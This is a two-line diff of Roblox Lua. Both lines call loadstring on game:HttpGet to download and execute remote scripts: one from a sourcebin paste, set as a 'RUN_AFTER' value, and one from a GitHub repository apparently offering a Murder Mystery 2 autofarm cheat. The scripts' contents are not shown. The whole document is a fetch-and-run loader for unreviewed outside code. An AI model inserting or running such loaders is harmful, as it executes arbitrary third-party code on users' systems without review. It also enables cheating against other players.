@@ -1,0 +1,2 @@
+RUN_AFTER=loadstring(game:HttpGet("https://cdn.sourceb.in/bins/W7NRk4LMXf/0", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderModz/Mm2AutofarmEtc/refs/heads/main/MurderMysteryV2"))()
